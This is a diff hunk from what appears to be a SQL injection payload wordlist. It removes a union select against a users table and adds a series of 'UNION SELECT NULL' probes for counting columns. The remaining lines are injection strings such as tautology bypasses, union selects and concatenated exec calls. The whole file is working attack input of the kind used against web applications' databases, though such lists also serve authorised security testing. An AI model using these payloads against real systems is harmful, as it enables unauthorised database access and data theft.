@@ -22,9 +22,13 @@ or 1=1--
 ' or 'whatever' in ('whatever')
 ' or 2 between 1 and 3
 ' or username like char(37);
-' union select * from users where login = char(114,111,111,116);
 ' union select 
-password:*/=1--
 '; execute immediate 'sel' || 'ect us' || 'er'
 '; exec ('sel' + 'ect us' + 'er')
 ' and 1 in (select var from temp)--
+' UNION SELECT NULL-- 
+' UNION SELECT NULL,NULL-- 
+' UNION SELECT NULL,NULL,NULL-- 
+' UNION SELECT NULL,NULL,NULL,NULL-- 
+' UNION SELECT NULL,NULL,NULL,NULL,NULL-- 
+' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- 
